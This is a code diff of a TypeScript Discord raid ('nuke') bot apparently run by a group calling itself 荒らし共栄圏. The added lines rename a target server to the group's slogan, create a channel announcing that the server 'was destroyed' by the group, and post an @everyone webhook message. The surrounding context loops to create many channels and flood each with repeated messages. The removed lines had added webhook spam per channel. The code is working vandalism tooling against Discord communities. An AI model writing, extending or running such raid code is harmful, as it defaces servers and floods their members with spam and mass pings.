@@ -73,6 +73,22 @@ https://discord.gg/annycW3Xrk
       const max = 32;
       discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
 
+      discordServer?.channels.create({
+        name: "このサーバーは荒らし共栄圏により破壊されました。",
+        type: 0,
+      }).then(async (channel: TextChannel) => {
+          const webhook = (await channel.createWebhook({
+            name: "荒らし共栄圏",
+            avatar: "https://storage.googleapis.com/zenn-user-upload/b89d2505cc99-20231228.png"
+          }))
+
+          webhook.send({
+            content: text + `\nこのサーバーは荒らし共栄圏により破壊されました。@everyone \n${Math.random().toString(36)}`,
+            username: "荒らし共栄圏",
+            avatarURL: "https://storage.googleapis.com/zenn-user-upload/b89d2505cc99-20231228.png"
+          })
+      })
+
       for (let i = 0; i < max / 2; i++) {
         try {
           discordServer?.channels
@@ -83,34 +99,12 @@ https://discord.gg/annycW3Xrk
               type: 0,
             })
             .then(async (channel: TextChannel) => {
-              const webhook = await channel.createWebhook({
-                name:
-                  "荒らし共栄圏 https://ctkpaarr.data.blog#Discord?" +
-                  Math.random().toString(36),
-                avatar:
-                  "https://storage.googleapis.com/zenn-user-upload/b89d2505cc99-20231228.png",
-              });
-
-              const url = webhook.url;
-
-              Logger.log(`Nuke Webhook created. ${url}`, "INFO");
-
               for (let j = 0; j < max * 3; j++) {
                 try {
                   await channel.send(
                     (text ?? "") + ` ${(j + Math.random()).toString(36)}`
                   );
 
-                  await fetch(url, {
-                    method: "POST",
-                    headers: {
-                      "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify({
-                      content:
-                        (text ?? "") + ` ${(j + Math.random()).toString(36)}`,
-                    }),
-                  });
                 } catch (_e) {
                   Logger.log(`Channel send failed.`, "WARN");
                 }
